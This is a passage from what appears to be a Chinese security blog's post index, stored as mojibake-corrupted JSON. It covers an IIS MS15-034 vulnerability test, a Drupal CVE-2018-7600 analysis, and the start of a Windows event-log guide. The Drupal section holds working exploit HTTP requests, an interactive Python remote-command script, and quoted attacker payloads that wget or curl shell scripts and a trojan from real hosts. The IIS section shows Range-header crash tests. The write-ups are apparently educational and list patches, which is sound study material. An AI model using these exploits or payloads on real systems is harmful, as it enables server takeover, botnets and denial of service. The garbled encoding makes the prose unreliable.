3ã€æ¼æ´å±å®³æ”»å‡»è€…åªéœ€è¦å‘é€æ¶æ„çš„httpè¯·æ±‚æ•°æ®åŒ…ï¼Œå°±å¯èƒ½è¿œç¨‹è¯»å–IISæœåŠ¡å™¨çš„å†…å­˜æ•°æ®ï¼Œæˆ–ä½¿æœåŠ¡å™¨ç³»ç»Ÿè“å±å´©æºƒã€‚ 4ã€å½±å“ç‰ˆæœ¬ä»»ä½•å®‰è£…äº†å¾®è½¯IIS 6.0ä»¥ä¸Šçš„çš„Windows 7ã€Windows Server 2008 R2ã€ Windows Server 2012 R2 ã€Windows Server 2012ã€Windows 8.2ã€Windows 8.1 ç³»ç»Ÿ äºŒã€æ¼æ´ç¯å¢ƒéƒ¨ç½²ç¯å¢ƒéƒ¨ç½²ï¼šwindows7ä¸‹å®‰è£…IISæœåŠ¡ å¦‚æœå‘ç°å®‰è£…å®Œæˆåï¼Œæœºå­ä¸Šä»æ²¡æœ‰IISæœåŠ¡ï¼Œå»ºè®®æŸ¥çœ‹ä»¥ä¸‹win7çš„ç‰ˆæœ¬ï¼ˆæ¡Œé¢çš„è®¡ç®—æœºå•å‡»å³é”®å±æ€§ï¼Œå³å¯æŸ¥çœ‹ï¼‰ï¼Œæ——èˆ°ç‰ˆã€ä¼ä¸šç‰ˆå’Œä¸“ä¸šç‰ˆæœ‰IISåŠŸèƒ½ï¼Œå®¶åº­ç‰ˆå’Œç®€æ˜“ç‰ˆæ˜¯æ²¡æœ‰çš„ã€‚éœ€è¦å°†å®¶åº­ç‰ˆå‡çº§ä¸ºæ——èˆ°ç‰ˆå³å¯ã€‚ å‡çº§åŠæ³•å¯å‚è€ƒï¼šhttp://jingyan.baidu.com/article/08b6a591ed82d314a809228d.html å®‰è£…æˆåŠŸï¼å¯åŠ¨å³å¯ï¼Œä¸ä½œä»»ä½•è®¾ç½®ã€‚ è®¿é—®ä¸‹å½“å‰IPåœ°å€ï¼ŒæŸ¥çœ‹IISç‰ˆæœ¬ ä¸‰ã€æ¼æ´éªŒè¯é¶æœºWin7ï¼š192.168.43.155 æ”»å‡»æœºKaliï¼š192.168.43.167 1ã€ä½¿ç”¨curlã€wgetå‘½ä»¤è¿›è¡Œæµ‹è¯•curl http://192.168.43.155 -H &quot;Host: 192.168.43.155&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;æˆ–è€…wget 192.168.43.155 -â€“debug -â€“header=&quot;Range: bytes=0-18446744073709551615&quot; è¿”å›416ï¼Œè¯´æ˜è¯¥ç³»ç»Ÿå­˜åœ¨æ¼æ´ï¼Œå…¶ä¸­Rangeå­—æ®µå€¼18446744073709551615è¡¨ç¤ºï¼šè½¬ä¸ºåå…­è¿›åˆ¶æ˜¯ 0xFFFFFFFFFFFFFFFF(16ä¸ªFï¼‰ï¼Œæ˜¯64ä½æ— ç¬¦å·æ•´å‹æ‰€èƒ½è¡¨è¾¾çš„æœ€å¤§æ•´æ•°ï¼Œæ•´æ•°æº¢å‡ºå¾€å¾€å’Œè¿™ä¸ªè¶…å¤§æ•´æ•°æœ‰å…³ã€‚ 2ã€ä½¿ç”¨Pythonè„šæœ¬éªŒè¯ï¼šCVE-2015-1635 POCPOCé“¾æ¥ï¼šhttps://github.com/w01ke/CVE-2015-1635-POC 3ã€burpsuiteæŠ“åŒ…æµ‹è¯• å››ã€æ¼æ´åˆ©ç”¨1ã€ms15_034å†…å­˜è¯»å–æ‰“å¼€msfconsoleï¼Œæœç´¢ms15_034 åˆ©ç”¨ms15_034æ¼æ´è¯»å–æœåŠ¡å™¨å†…å­˜æ•°æ®ï¼šä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰æ˜¾ç¤ºå†…å­˜æ•°æ®â€¦â€¦ 2ã€ms15_034 ddosæ”»å‡» æ”»å‡»æˆåŠŸï¼šwindows7è“å±ï¼Œè“å±åä¼šè‡ªåŠ¨é‡å¯ äº”ã€æ¼æ´é˜²å¾¡ç¦ç”¨IISçš„å†…æ ¸ç¼“å­˜ï¼šå¯èƒ½å¯¼è‡´IISæ€§èƒ½é™ä½ ç¼“è§£æ–¹æ¡ˆï¼šhttps://technet.microsoft.com/en-us/library/cc731903(v=ws.10).aspx å‡çº§è¡¥ä¸ï¼šhttps://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034?redirectedfrom=MSDN åŒå‡»è¾“å‡ºç¼“å­˜ä¸­çš„åŠæ³•ï¼šhttps://blog.csdn.net/u010082526/article/details/84955085 å…­ã€å‚è€ƒé“¾æ¥https://blog.csdn.net/qq_41210745/article/details/103437683","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä¸­é—´ä»¶æ¼æ´","slug":"ä¸­é—´ä»¶æ¼æ´","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"IIS","slug":"IIS","permalink":"https://wolke.cn/tags/IIS/"}],"author":"w01ke"},{"title":"Drupalè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2018-7600ï¼‰","slug":"Drupalè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2018-7600ï¼‰","date":"2022-04-09T01:50:32.000Z","updated":"2022-04-09T02:12:05.459Z","comments":true,"path":"post/5279f9a1.html","link":"","permalink":"https://wolke.cn/post/5279f9a1.html","excerpt":"","text":"ä¸€ã€æ¼æ´ç®€ä»‹Drupalæ˜¯ä¸€ä¸ªå¼€æºå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œå…¨çƒè¶…è¿‡100ä¸‡ä¸ªç½‘ç«™ï¼ˆåŒ…æ‹¬æ”¿åºœï¼Œç”µå­é›¶å”®ï¼Œä¼ä¸šç»„ç»‡ï¼Œé‡‘èæœºæ„ç­‰ï¼‰ä½¿ç”¨ã€‚Drupalå®‰å…¨å›¢é˜ŸæŠ«éœ²äº†ä¸€ä¸ªéå¸¸å…³é”®çš„æ¼æ´ï¼Œç¼–å·CVE-2018-7600 Drupalå¯¹è¡¨å•è¯·æ±‚å†…å®¹æœªåšä¸¥æ ¼è¿‡æ»¤ï¼Œå› æ­¤ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯èƒ½å°†æ¶æ„æ³¨å…¥è¡¨å•å†…å®¹ï¼Œæ­¤æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨é»˜è®¤æˆ–å¸¸è§çš„Drupalå®‰è£…ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ äºŒã€æ¼æ´åŸç†è¯¥æ¼æ´çš„äº§ç”Ÿçš„æ ¹æœ¬åŸå› åœ¨äºDrupalå¯¹è¡¨å•çš„æ¸²æŸ“ä¸Šã€‚ Drupalä¸ºäº†åœ¨è¡¨å•æ¸²æŸ“è¿‡ç¨‹ä¸­èƒ½å¤ŸåŠ¨æ€ä¿®æ”¹æ•°æ®ï¼Œä»6.xç‰ˆæœ¬å¼€å§‹ä¾¿å¼•å…¥äº†â€œDrupal Form APIâ€çš„æ¦‚å¿µã€‚ ç›¸å…³æ–‡æ¡£å¦‚ä¸‹ï¼šhttps://api.drupal.org/api/drupal/elements/8.6.x è¿™äº›â€œå¯æ¸²æŸ“çš„æ•°ç»„(Renderable arrays)â€å°±æ˜¯å¼•å‘æ­¤æ¬¡æ¼æ´çš„â€å…ƒå‡¶â€ï¼Œå®ƒç”±ä¸€ä¸ªkey-valueç»“æ„å­˜å‚¨ï¼Œå…¶ä¸­keyéƒ½ä»¥#(hash sign)å¼€å¤´ï¼Œå¦‚ä¸‹æ‰€ç¤º [ â€˜#typeâ€™ =&gt; â€˜markupâ€™, â€˜#markupâ€™ =&gt; â€˜&lt;em&gt;some text&lt;/em&gt;â€™, â€˜#prefixâ€™ =&gt; â€˜&lt;div&gt;â€™, â€˜#suffixâ€™ =&gt; â€˜&lt;/div&gt;â€™ ] Drupalåœ¨æ¸²æŸ“è¿™äº›â€œæ•°ç»„â€æ—¶ï¼Œå°†å…¶ä¸­çš„æ•°æ®æœªç»å®‰å…¨è¿‡æ»¤ä¼ å…¥åˆ°doRenderå‡½æ•°ä¸­ã€‚ ä»¥ä¸‹æ˜¯doRenderå‡½æ•°è°ƒç”¨call_user_func_arrayå‡½æ•°çš„ä»£ç ç‰‡æ®µï¼š è¯¥æ–¹æ³•å–å‡ºâ€å¯æ¸²æŸ“æ•°ç»„â€#lazy_builderçš„å€¼ï¼Œæœªç»è¿‡æ»¤ç›´æ¥ä¼ å…¥call_user_func_arrayå‡½æ•°ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚ æ”»å‡»é“¾è·¯è¿˜åŸå¦‚ä¸‹ï¼š é»‘å®¢åœ¨â€œå¯æ¸²æŸ“æ•°ç»„â€ä¸­æ’å…¥æ„é€ æ¶æ„ä»£ç ï¼Œå¦‚ï¼šmail[#post_render][]=æ¶æ„ä»£ç  é€šè¿‡POSTæ–¹æ³•å°†å«æœ‰æ¶æ„ä»£ç çš„â€œå¯æ¸²æŸ“æ•°ç»„â€æäº¤åˆ°drupalç³»ç»Ÿä¸­ã€‚ é¡µé¢æ¸²æŸ“æµç¨‹ä¸­ï¼Œâ€œå¯æ¸²æŸ“æ•°ç»„â€ä¸­æºå¸¦çš„æ¶æ„ä»£ç ä¾æ¬¡ç»è¿‡buildform-&gt;uploadAjaxCallback-&gt;renderRoot-&gt;doRenderæ–¹æ³•ã€‚ æœ€ç»ˆdoRenderæ–¹æ³•å°†â€œå¯æ¸²æŸ“æ•°ç»„â€ä¸­çš„æ¶æ„ä»£ç å–å‡ºï¼Œä¼ å…¥call_user_funcå‡½æ•°ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼ŒæˆåŠŸè§¦å‘æ¼æ´ï¼Œç½‘ç«™æ²¦é™·ã€‚ ç›¸å…³ä»£ç ï¼šhttps://github.com/drupal/drupal/blob/8.6.x/core/lib/Drupal/Core/Render/Renderer.php ä¸‰ã€å½±å“ç‰ˆæœ¬Drupal 6.xDrupal 7.xDrupal 8.x å››ã€æ¼æ´åˆ©ç”¨è‡ªä»æ¼æ´CVE-2018-7600å…¬å¸ƒå¼€å§‹ï¼Œé˜¿é‡Œäº‘å®‰å…¨æŠ€æœ¯å®éªŒå®¤å°±æŒç»­è·Ÿè¸ªå’Œç›‘æ§è¯¥æ¼æ´çš„åˆ©ç”¨æƒ…å†µï¼Œå‘ç°é»‘å®¢ä»2018-04-12å¼€å§‹å°±å·²ç»è¿›è¡Œäº†å¤§æ‰¹é‡çš„æ¼æ´æ”»å‡»ã€‚ä»æœ€è¿‘è¿™æ®µæ—¶é—´ç›‘æ§åˆ°çš„æ•°æ®å‘ç°ï¼Œå·²æœ‰å¤šä¸ªé»‘å®¢ç»„ç»‡å¼€å§‹ä½¿ç”¨è¯¥æ¼æ´æ¥ä»äº‹é»‘äº§æ´»åŠ¨ã€‚ 1ã€æŒ–çŸ¿ç‰Ÿåˆ© æˆ‘ä»¬æ•è·åˆ°é»‘å®¢ç²¾å¿ƒæ„é€ POSTæ•°æ®ï¼Œåˆ©ç”¨Drupalæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå®ç°æŒ–çŸ¿ç›ˆåˆ©ã€‚å…·ä½“æ ·ä¾‹å¦‚ä¸‹ï¼š mail[#markup]=wget -q http://67.231.243.10:8220/logo4.jpg -O - | sh&amp;mail[#type]=markup&amp;form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec logo4.jpgå®é™…æ˜¯ä¸€ä¸ªshellè„šæœ¬ï¼Œè¯¥shellè„šæœ¬æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼š å°è¯•ç»“æŸå¸‚é¢ä¸Šå…¶ä»–æŒ–çŸ¿è¿›ç¨‹ï¼›å…¶éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š ä¸‹è½½æŒ–çŸ¿ç¨‹åºå’ŒæŒ–çŸ¿ç¨‹åºé…ç½®è„šæœ¬ï¼Œå¹¶å¼€å§‹æŒ–çŸ¿ã€‚ æ‹¿åˆ°é»‘å®¢çš„é’±åŒ…åœ°å€åï¼Œæˆ‘ä»¬åœ¨æŸä¸ªçŸ¿æ± ä¸­å‘ç°è¯¥é»‘å®¢å·²ç»è·å¾—äº†75.87ä¸ªé—¨ç½—å¸ï¼Œæ ¹æ®å¸‚åœºé—¨ç½—å¸çš„è¡Œæƒ…é¢„ä¼°ï¼Œè¯¥é»‘å®¢å•åœ¨è¿™ä¸€ä¸ªçŸ¿æ± ä¸­å°±å·²ç»ç‰Ÿåˆ©11Wï¼Œè€Œä¸”è¯¥åœ°å€çš„é—¨ç½—å¸æ•°é‡å†ä»¥æ¯å¤©ä¸¤ä¸ªçš„æ•°é‡åœ¨é€’å¢ï¼Œå…¶ä¸­åˆ©æ¶¦ä¹‹å¤§å¯è§ä¸€æ–‘ã€‚ 2ã€æ„å»ºBillGatesåƒµå°¸ç½‘ç»œé»‘å®¢æ‰§è¡Œ wget -c -P /etc/ http://111.73.46.196:9876/sysxlv å‘½ä»¤ï¼Œä¸‹è½½BillGatesæœ¨é©¬ï¼Œç”¨äºæ„å»ºè‡ªå·±çš„åƒµå°¸ç½‘ç»œã€‚ è¯¥åƒµå°¸ç½‘ç»œçš„ç›¸å…³ä¿¡æ¯ï¼š æ´»è·ƒæ—¶é—´ï¼š2018-02-14 ~ è‡³ä»Š ä¸­æ§IPï¼š111.73.46.196 ç›¸å…³åŸŸåï¼šxvw.f3322.net å…³è”æ ·æœ¬ï¼še05747461650ae6688fe0ed2b1104f0e æˆªè‡³ç›®å‰ï¼Œå½±å“äº‘ä¸Šç”¨æˆ·è¶‹åŠ¿å›¾å¦‚ä¸‹ï¼š 3ã€æ”¶é›†ä¿¡æ¯å¹¶ä¼ æ’­Miraiåƒµå°¸ç½‘ç»œé»‘å®¢é€šè¿‡ä¸‹å‘æ¶æ„shellä»£ç ï¼Œä¼ æ’­Miraiåƒµå°¸ç½‘ç»œã€‚ ä¸‹å›¾æ˜¯shellé€šè¿‡wgetå°†ç”¨æˆ·æœºå™¨ä¿¡æ¯POSTåˆ°tc8zdw.if1j0ytgkypa.tkï¼š æ•°æ®å„ä¸ªå­—æ®µçš„å€¼å‡ç”¨base64åŠ å¯†è¿‡ï¼Œè§£å¯†åå¦‚ä¸‹ï¼š ä¸Šä¼ ä¿¡æ¯å­—æ®µåå­—æ®µbase64è§£ç åçš„å€¼ version EXD act upï¼Œè¡¨ç¤ºä¸Šä¼  uid uid=0(root) gid=0(root) groups=0(root) uname Linux iZt4ncf567x3bguk2zv6haZ 2.6.32-696.16.1.el6.x86_64 #1 SMP Wed Nov 15 16:51:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux arch 64ï¼Œè¡¨ç¤º64ä¸ºæ“ä½œç³»ç»Ÿ network process åä¸º64çš„ç¨‹åºå®é™…æ˜¯ä¸€ä¸ªLoaderï¼Œè´Ÿè´£åˆ¤æ–­ç¯å¢ƒï¼Œç„¶åä¸‹è½½ä¸åŒç‰ˆæœ¬çš„Miraiåƒµå°¸ç½‘ç»œã€‚é™¤æ­¤ä¹‹å¤–è¿˜ä¼šæ‰§è¡Œå…¶ä»–payloadï¼Œå¦‚ curl -fsSL http://tc8zdw.if1j0ytgkypa.tk/64 -o /tmp/57332442ã€‚ å…¥ä¾µè¶‹åŠ¿ é˜¿é‡Œäº‘å®‰å…¨æŠ€æœ¯å®éªŒå®¤ä»æ¼æ´å…¬å¸ƒå¼€å§‹å³å¯†åˆ‡å…³æ³¨äº‘ä¸Šè¯¥æ¼æ´åˆ©ç”¨æƒ…å†µï¼Œå‘ç°äº‘ä¸Šæ‰¹é‡æ”»å‡»å§‹äº2018-04-12æ—¥ï¼Œå¹¶å¿«é€Ÿå¢é•¿ï¼Œéšç€é˜¿é‡Œäº‘å„ä¸ªå®‰å…¨äº§å“çš„è”åŠ¨æ‹¦æˆªä»¥åŠå¼•å¯¼ç”¨æˆ·è¿›è¡Œæ¼æ´ä¿®å¤åï¼Œå…¥ä¾µè¶‹åŠ¿å·²åŸºæœ¬ä¸‹é™ä¸‹æ¥ã€‚ å¨èƒè¯„ä¼° æœ¬æ¬¡è¡¥ä¸å…¬å¸ƒçš„æ—¶é—´ç‚¹é¢†å…ˆäº†æ‰¹é‡æ¼æ´åˆ©ç”¨æ—¶é—´ç‚¹ï¼Œç”¨æˆ·æ‹¥æœ‰ä¸¤å‘¨æ—¶é—´æ¥è¿›è¡Œå®‰å…¨æ›´æ–°ã€‚äºæ­¤åŒæ—¶ï¼Œäº‘ç›¾æ€åŠ¿æ„ŸçŸ¥é€šç”¨å…¥ä¾µæ£€æµ‹æ¨¡å‹åœ¨æ¼æ´è¯¦æƒ…ä¸ºå…¬å¸ƒå‰å·²ç»å®ç°è‡ªåŠ¨è¦†ç›–å¹¶å‘ç”¨æˆ·æ¨é€å‘Šè­¦ï¼Œç›®å‰ç»å¤§éƒ¨åˆ†Drupalç”¨æˆ·å·²ç»ä¿®å¤æ­¤æ¼æ´ï¼Œæ®æœ€è¿‘ä¸€æ¬¡å…¥ä¾µè¶‹åŠ¿è§‚æµ‹ç»“æœ(2018.04.18)æ˜¾ç¤ºï¼Œå…¬æœ‰äº‘å­˜åœ¨æ¼æ´çš„DrupalæœåŠ¡ä»…æœ‰2.6%ã€‚ ä¸åŒç±»RCEæ¼æ´ç›¸æ¯”ï¼Œç°é˜¶æ®µ Drupal(Drupalgeddon 2) æ€ä¼¤åŠ›æœªè¿›å…¥RCEæ¼æ´ç¬¬ä¸€æ¢¯é˜Ÿã€‚ äº”ã€POCè®¿é—®Drupalé¶åœº POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 107form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=idã€æ›¿æ¢idæ‰§è¡Œå‘½ä»¤ã€‘POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: ip:8080User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://172.18.0.1:8080/user/registerX-Requested-With: XMLHttpRequestContent-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663Content-Length: 625Connection: close-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#post_render][]&quot;passthru-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#type]&quot;markup-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#markup]&quot;whoami-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;form_id&quot;user_register_form-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;_drupal_ajax&quot; äº¤äº’å¼å‘½ä»¤æ‰§è¡Œpython3è„šæœ¬ï¼š ä½¿ç”¨python2 RCE.py http://127.0.0.1:8080 import requestsimport refrom sys import argvdomain = argv[1]def exploit(command): HOST=domain get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:&#x27;passthru&#x27;, &#x27;name[#markup]&#x27;:command, &#x27;name[#type]&#x27;:&#x27;markup&#x27;&#125; post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;&#125; r = requests.post(HOST, data=post_params, params=get_params) m = re.search(r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#x27;, r.text) if m: found = m.group(1) get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + found&#125; post_params = &#123;&#x27;form_build_id&#x27;:found&#125; r = requests.post(HOST, data=post_params, params=get_params) print(&quot;\\n&quot;.join(r.text.split(&quot;\\n&quot;)[:-1]))while True: command = raw_input(&#x27;$ &#x27;) exploit(command) å…­ã€åº”å¯¹ç­–ç•¥å®˜æ–¹å·²ç»ä¿®å¤æ­¤æ¼æ´ï¼Œè¯·åŠæ—¶æ›´æ–°Drupalç‰ˆæœ¬æˆ–å‚è€ƒè¡¥ä¸è‡ªè¡Œä¿®å¤ï¼š Drupal 7.x è¯·æ›´æ–°è‡³7.58ç‰ˆæœ¬(https://www.drupal.org/project/drupal/releases/7.58) æˆ–å‚è€ƒæ­¤è¡¥ä¸è¿›è¡Œä¿®å¤ (https://cgit.drupalcode.org/drupal/rawdiff/?h=7.x&amp;id=2266d2a83db50e2f97682d9a0fb8a18e2722cba5) Drupal 8.3.x è¯·æ›´æ–°è‡³8.3.9ç‰ˆæœ¬(https://www.drupal.org/project/drupal/releases/8.3.9) æˆ–å‚è€ƒæ­¤è¡¥ä¸è¿›è¡Œä¿®å¤(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) Drupal 8.4.x è¯·æ›´æ–°è‡³8.4.6ç‰ˆæœ¬(https://www.drupal.org/project/drupal/releases/8.4.6) æˆ–å‚è€ƒæ­¤è¡¥ä¸è¿›è¡Œä¿®å¤(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) Drupal 8.5.x è¯·æ›´æ–°è‡³8.5.1ç‰ˆæœ¬(https://www.drupal.org/project/drupal/releases/8.5.1) æˆ–å‚è€ƒæ­¤è¡¥ä¸è¿›è¡Œä¿®å¤(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) ä¸ƒã€å‚è€ƒé“¾æ¥ https://developer.aliyun.com/article/584991 https://blog.csdn.net/weixin_42742658/article/details/112479848","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"}],"author":"w01ke"},{"title":"Windowsæ—¥å¿—åˆ†æ","slug":"Windowsæ—¥å¿—åˆ†æ","date":"2022-04-08T10:59:31.000Z","updated":"2022-04-08T11:01:38.383Z","comments":true,"path":"post/604d6f82.html","link":"","permalink":"https://wolke.cn/post/604d6f82.html","excerpt":"","text":"ä¸€ã€Windowsäº‹ä»¶æ—¥å¿—ç®€ä»‹Windowsç³»ç»Ÿæ—¥å¿—æ˜¯è®°å½•ç³»ç»Ÿä¸­ç¡¬ä»¶ã€è½¯ä»¶å’Œç³»ç»Ÿé—®é¢˜çš„ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜å¯ä»¥ç›‘è§†ç³»ç»Ÿä¸­å‘ç”Ÿçš„äº‹ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒæ¥æ£€æŸ¥é”™è¯¯å‘ç”Ÿçš„åŸå› ï¼Œæˆ–è€…å¯»æ‰¾å—åˆ°æ”»å‡»æ—¶æ”»å‡»è€…ç•™ä¸‹çš„ç—•è¿¹ã€‚ Windowsä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç±»æ—¥å¿—è®°å½•ç³»ç»Ÿäº‹ä»¶ï¼šåº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—å’Œå®‰å…¨æ—¥å¿—ã€‚ ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ—¥å¿—å­˜å‚¨ç€æ•…éšœæ’é™¤ä¿¡æ¯ï¼Œå¯¹äºç³»ç»Ÿç®¡ç†å‘˜æ›´ä¸ºæœ‰ç”¨ã€‚ å®‰å…¨æ—¥å¿—è®°å½•ç€äº‹ä»¶å®¡è®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·éªŒè¯ï¼ˆç™»å½•ã€è¿œç¨‹è®¿é—®ç­‰ï¼‰å’Œç‰¹å®šç”¨æˆ·åœ¨è®¤è¯åå¯¹ç³»ç»Ÿåšäº†ä»€ä¹ˆï¼Œå¯¹äºè°ƒæŸ¥äººå‘˜è€Œè¨€ï¼Œæ›´æœ‰å¸®åŠ©ã€‚ 1ã€ç³»ç»Ÿæ—¥å¿—è®°å½•æ“ä½œç³»ç»Ÿç»„ä»¶äº§ç”Ÿçš„äº‹ä»¶ï¼Œä¸»è¦åŒ…æ‹¬é©±åŠ¨ç¨‹åºã€ç³»ç»Ÿç»„ä»¶å’Œåº”ç”¨è½¯ä»¶çš„å´©æºƒä»¥åŠæ•°æ®ä¸¢å¤±é”™è¯¯ç­‰ã€‚ç³»ç»Ÿæ—¥å¿—ä¸­è®°å½•çš„æ—¶é—´ç±»å‹ç”±Windows NT/2000æ“ä½œç³»ç»Ÿé¢„å…ˆå®šä¹‰ã€‚ é»˜è®¤ä½ç½®ï¼š %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 2ã€åº”ç”¨ç¨‹åºæ—¥å¿—åŒ…å«ç”±åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿç¨‹åºè®°å½•çš„äº‹ä»¶ï¼Œä¸»è¦è®°å½•ç¨‹åºè¿è¡Œæ–¹é¢çš„äº‹ä»¶ï¼Œä¾‹å¦‚æ•°æ®åº“ç¨‹åºå¯ä»¥åœ¨åº”ç”¨ç¨‹åºæ—¥å¿—ä¸­è®°å½•æ–‡ä»¶é”™è¯¯ï¼Œç¨‹åºå¼€å‘äººå‘˜å¯ä»¥è‡ªè¡Œå†³å®šç›‘è§†å“ªäº›äº‹ä»¶ã€‚å¦‚æœæŸä¸ªåº”ç”¨ç¨‹åºå‡ºç°å´©æºƒæƒ…å†µï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä»ç¨‹åºäº‹ä»¶æ—¥å¿—ä¸­æ‰¾åˆ°ç›¸åº”çš„è®°å½•ï¼Œä¹Ÿè®¸ä¼šæœ‰åŠ©äºä½ è§£å†³é—®é¢˜ã€‚ é»˜è®¤ä½ç½®ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 3ã€å®‰å…¨æ—¥å¿—è®°å½•ç³»ç»Ÿçš„å®‰å…¨å®¡è®¡äº‹ä»¶ï¼ŒåŒ…å«å„ç§ç±»å‹çš„ç™»å½•æ—¥å¿—ã€å¯¹è±¡è®¿é—®æ—¥å¿—ã€è¿›ç¨‹è¿½è¸ªæ—¥å¿—ã€ç‰¹æƒä½¿ç”¨ã€å¸å·ç®¡ç†ã€ç­–ç•¥å˜æ›´ã€ç³»ç»Ÿäº‹ä»¶ã€‚å®‰å…¨æ—¥å¿—ä¹Ÿæ˜¯è°ƒæŸ¥å–è¯ä¸­æœ€å¸¸ç”¨åˆ°çš„æ—¥å¿—ã€‚é»˜è®¤è®¾ç½®ä¸‹ï¼Œå®‰å…¨æ€§æ—¥å¿—æ˜¯å…³é—­çš„ï¼Œç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨ç»„ç­–ç•¥æ¥å¯åŠ¨å®‰å…¨æ€§æ—¥å¿—ï¼Œæˆ–è€…åœ¨æ³¨å†Œè¡¨ä¸­è®¾ç½®å®¡æ ¸ç­–ç•¥ï¼Œä»¥ä¾¿å½“å®‰å…¨æ€§æ—¥å¿—æ»¡åä½¿ç³»ç»Ÿåœæ­¢å“åº”ã€‚ é»˜è®¤ä½ç½®ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx äºŒã€å®¡æ ¸ç­–ç•¥ä¸äº‹ä»¶æŸ¥çœ‹å™¨Windows Server 2008 R2 ç³»ç»Ÿçš„å®¡æ ¸åŠŸèƒ½åœ¨é»˜è®¤çŠ¶æ€ä¸‹å¹¶æ²¡æœ‰å¯ç”¨ ï¼Œå»ºè®®å¼€å¯å®¡æ ¸ç­–ç•¥ï¼Œè‹¥æ—¥åç³»ç»Ÿå‡ºç°æ•…éšœã€å®‰å…¨äº‹æ•…åˆ™å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ’é™¤æ•…éšœï¼Œè¿½æŸ¥å…¥ä¾µè€…çš„ä¿¡æ¯ç­‰ã€‚ PSï¼šé»˜è®¤çŠ¶æ€ä¸‹ï¼Œä¹Ÿä¼šè®°å½•ä¸€äº›ç®€å•çš„æ—¥å¿—ï¼Œæ—¥å¿—é»˜è®¤å¤§å°20M è®¾ç½®1ï¼šå¼€å§‹ â†’ ç®¡ç†å·¥å…· â†’ æœ¬åœ°å®‰å…¨ç­–ç•¥ â†’ æœ¬åœ°ç­–ç•¥ â†’ å®¡æ ¸ç­–ç•¥ï¼Œå‚è€ƒé…ç½®æ“ä½œï¼š è®¾ç½®2ï¼šè®¾ç½®åˆç†çš„æ—¥å¿—å±æ€§ï¼Œå³æ—¥å¿—æœ€å¤§å¤§å°ã€äº‹ä»¶è¦†ç›–é˜€å€¼ç­‰ï¼š 